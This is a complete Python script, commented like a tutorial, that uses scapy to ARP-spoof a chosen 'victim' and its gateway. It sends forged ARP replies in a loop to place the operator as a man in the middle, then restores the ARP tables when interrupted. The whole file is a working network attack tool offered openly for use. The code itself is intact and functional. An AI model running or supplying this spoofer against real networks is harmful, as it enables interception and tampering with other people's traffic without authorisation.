#! /usr/bin/python3

#scapy lets us probe, scan or attack networks.
import scapy.all as scapy
#time allow us to make our code wait an amount of time
import time
#argparse allow us input arguments
import argparse

#function that creates arguments inputs for the user to enter the IP of the victim and the ip of the gateway
def get_argument():
    #We create an object of argparse
    parser = argparse.ArgumentParser()
    #We store the values of the target IP 
    parser.add_argument("-t", "--target", dest= "target", help= "The IP of the target/victim to spoof. EX: 10.0.2.5")
    #We store the values of the tIP gateway
    parser.add_argument("-g", "--gateway", dest= "gateway", help= "The IP of the device gateway. EX: 10.0.2.1")
    #We capture the arguments
    args = parser.parse_args()
    #We make sure the arguments are not empthy
    if not args.target:
        #code to handle the error
        raise argparse.ArgumentTypeError("[-] Please specify the IP of the target/victim, use --help for more info")   
    elif not args.gateway:
        #code to handle the error
        raise argparse.ArgumentTypeError("[-] Please specify an IP of the gateway, use --help for more info")
    else:
        #If everything is correct we return the arguments
        return args
    
#Function that return the MAC address of an IP 
def get_mac(ip):
    #this send an ARP request to the ip range provided
    arp_request = scapy.ARP(pdst = ip)
    #stored in broadcast, this make sure to send the broadcast MAC adress
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #make a packet of a request combining both ARP request and Broadcast
    arp_request_broadcast = broadcast/arp_request
    #stored the reponse of the ARP request, ans store the packets answered and unans store the packets unanswered
    ans_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    #return the MAC address of the IP specified
    return ans_list[0][1].hwsrc

#Function that send packets to the router and the victims pc and fool them to make a MiTM(Man in the Middle)
def spoof(target_ip, spoof_ip):
    #We call the gec mac function with the information of the MAc address of the ip spicified
    target_mac = get_mac(target_ip)
    #This packet fool the target computer to let them think we are the router
    packet = scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
    #Send the packet to the target
    scapy.send(packet, verbose= False)

#function that restore the state of the victims device
def restore(dest_ip, source_ip):
    #variable that store destination MAc address
    dest_mac = get_mac(dest_ip)
    #variable that store the source MAC address
    source_mac = get_mac(source_ip)
    #This packet fool the target computer to let them think we are the router
    packet = scapy.ARP(op=2, pdst= dest_ip, hwdst= dest_mac, psrc= source_ip, hwsrc= source_mac)
    #Send the packet to the target
    scapy.send(packet, verbose= False, count=4)

#Call the get argument function to get the inpout of the user
args = get_argument()
#variable of the victims IP
target_ip = args.target
#gateway of the device
gateway_ip = args.gateway
#Variable that count the number of packets sent
packets_count = 0
#managing error outputs
try:
    #This loops keep sending packets to both the victim and the router
    while True:
        #Send packet to the victim to let them think im the router
        spoof(target_ip,gateway_ip)
        #Send packet to the router to let them think im th victim
        spoof(gateway_ip,target_ip)
        #Update the packet counter value
        packets_count = packets_count + 2
        #Print a message to tell the user the number of packets sent and stored in a buffer
        print( "\r[+] Packets sent: " + str(packets_count), end="")
        #Make the code wait 2 second to send packets again
        time.sleep(2)
#manage the error
except KeyboardInterrupt:
    #printing information when pressing CONTROL C
    print("\n[-] Quitting...")
    #restore the victims device to normal
    restore(target_ip,gateway_ip)
    #restore the router device to normal
    restore(gateway_ip,target_ip)
    #print message that everything is back to normal
    print("[+] ARP tables restored.\n")
